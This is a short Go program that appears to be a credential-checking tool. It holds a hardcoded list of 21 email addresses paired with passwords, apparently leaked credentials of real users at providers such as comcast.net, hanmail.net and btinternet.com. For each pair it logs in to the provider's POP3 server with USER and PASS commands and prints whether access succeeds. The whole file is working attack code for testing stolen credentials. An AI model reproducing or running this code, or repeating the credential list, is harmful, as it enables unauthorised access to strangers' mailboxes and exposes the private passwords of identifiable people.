package main

import (
	. "fmt"
	"net"

	// "os"
	"strings"
	"time"
)

var emails []string = []string{
	"kang2104@hanmail.net:kang2765",
	"yann.dubertret@laposte.net:jojo84",
	"jayne.anastasi@comcast.net:Mukilteo1",
	"jmatthews@suddenlink.net:jakob1996",
	"tomdelaureal@suddenlink.net:mimi1947",
	"joanneboyes123@btinternet.com:bellajade1",
	"chs0314@hanmail.net:min7004",
	"noemie.mcps@laposte.net:Papaamour44",
	"tom.lowery@btinternet.com:armistead8",
	"donnamcginn@comcast.net:donna6387",
	"firefighter60@suddenlink.net:fire6033",
	"vivien43@btinternet.com:follow7up",
	"hay361@btinternet.com:cortina64",
	"swift656@btinternet.com:laura123",
	"walkermr@comcast.net:foursure",
	"ysjloveksj229@hanmail.net:ksj922000",
	"sangsu-juyun@hanmail.net:dh010622",
	"4001-1004@hanmail.net:s1126611",
	"markrine@suddenlink.net:star3140",
	"kenneth_0005@suddenlink.net:ruffryder1",
	"gen712@suddenlink.net:cancer12",
}

func main() {
	buff := make([]byte, 1024*4)

	for _, email := range emails {
		lsp := strings.Split(email, ":")
		ls := strings.Split(lsp[0], "@")
		login := ls[0]
		password := lsp[1]
		server := ls[1]

		// Println(login_server[0], Sprintf("pop.%s:110", login_server[1]), login_server_pass[1])

		conn, err := net.DialTimeout("tcp", Sprintf("pop.%s:110", server), 3*time.Second)
		if err != nil {
			// Println(err)
			continue
		}

		Println(login, password, server)

		n, err := conn.Read(buff)
		if err != nil {
			Println(err)
			continue
		}
		Println(string(buff[:n-1]))
		conn.Write([]byte(Sprintf("USER %s@%s\r\n", login, server)))
		n, err = conn.Read(buff)
		if err != nil {
			Println(err)
			continue
		}
		Println(string(buff[:n-1]))
		conn.Write([]byte(Sprintf("PASS %s\r\n", password)))
		n, err = conn.Read(buff)
		if err != nil {
			Println(err)
			continue
		}
		Println(string(buff[:n-1]))
		conn.Write([]byte(Sprintf("STAT\r\n")))
		n, err = conn.Read(buff)
		if err != nil {
			Println(err)
			continue
		}
		Println(string(buff[:n-1]))

		conn.Write([]byte("QUIT\r\b"))
		conn.Close()

		// if string(buff[:3]) == "+OK" {
		// 	// Println("connected")
		// 	conn.Write([]byte(Sprintf("USER %s@%s", login, server)))
		// 	n, _ := conn.Read(buff)
		// 	Println(string(buff[:n-1]))
		// 	if string(buff[:3]) == "+OK" {
		// 		// Println("login checked")
		// 		conn.Write([]byte(Sprintf("PASS %s", password)))
		// 		n, _ := conn.Read(buff)
		// 		Println(string(buff[:n-1]))
		// 		if string(buff[:3]) == "+OK" {
		// 			// Println("pass checked")
		// 			conn.Write([]byte(Sprintf("%s", "LIST")))
		// 			n, _ := conn.Read(buff)
		// 			Println(string(buff[:n-1]))
		// 			os.Exit(0)
		// 		} else {
		// 			continue
		// 		}
		// 	} else {
		// 		continue
		// 	}
		// } else {
		// 	continue
		// }
	}
}
